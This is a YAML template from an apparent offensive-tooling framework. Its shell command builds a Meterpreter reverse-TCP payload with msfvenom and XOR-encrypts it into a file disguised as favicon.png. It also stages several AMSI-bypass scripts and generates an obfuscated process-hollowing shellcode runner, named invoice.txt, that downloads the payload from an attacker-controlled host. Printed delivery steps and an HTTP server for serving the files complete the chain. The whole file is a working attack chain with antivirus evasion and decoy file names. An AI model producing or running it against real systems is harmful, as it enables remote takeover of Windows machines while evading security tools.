metadata:
  filename: "deliver-windows-x64-metasploit-shellcode-runner-powershell-hollowing.yaml"
  tags: ["shell", "windows", "evasion"]
  created: "2026-05-27"
  authors: ["@s3mme", "@TIVKU"]

content: |
  mkdir -p packstation/outbound; \
  printf '%s\n' 'msfvenom creates the shellcode. Please wait...'; \
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ attacker_ip }} LPORT={{ shell_port }} EXITFUNC=thread -f raw > packstation/outbound/shellcode.bin ; \
  python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset.yaml > packstation/outbound/offer1.txt; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-fieldoffset-2.yaml > packstation/outbound/offer2.txt; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-forceerror.yaml > packstation/outbound/offer3.txt; \
  sed -n '/^content: |/{n; s/^  //; p; q}' {{ templates_dir }}/payloads/amsi-bypass-windows-mattgref02.yaml > packstation/outbound/offer4.txt; \
  python {{ templates_dir }}/helper_scripts/shellcode_runner_generator.py -t hollowing -d staged --url http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png --xor CA --timing --obfuscate -o packstation/outbound/invoice.txt ; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                      ------Listener------                      '; \
  printf '%s\n' 'Start listener: {{ include('scripts/listener-metasploit-windows-x64-meterpreter-staged-tcp.yaml') }}'; \
  printf '%s\n' '================================================================'; \
  printf '%s\n' '                  ---Step-by-Step Delivery---                  '; \
  printf '%s\n' 'Step 1 - Pick an AMSI bypass and copy it to offer.txt:'; \
  printf '%s\n' '  offer1.txt (FieldOffset):   cp packstation/outbound/offer1.txt packstation/outbound/offer.txt'; \
  printf '%s\n' '  offer2.txt (FieldOffset 2): cp packstation/outbound/offer2.txt packstation/outbound/offer.txt'; \
  printf '%s\n' '  offer3.txt (ForceError):    cp packstation/outbound/offer3.txt packstation/outbound/offer.txt'; \
  printf '%s\n' '  offer4.txt (MattGref02):    cp packstation/outbound/offer4.txt packstation/outbound/offer.txt'; \
  printf '%s\n' 'Step 2 - Run AMSI bypass + shellcode runner (process hollowing):'; \
  printf '%s\n' '  {{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell.yaml') }}'; \
  printf '%s\n' '  or base64 encoded:'; \
  printf '%s\n' '  {{ include('payloads/transfer-amsi-bypass-shellcode-runner-windows-powershell-base64encoded.yaml') }}'; \
  printf '%s\n' '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
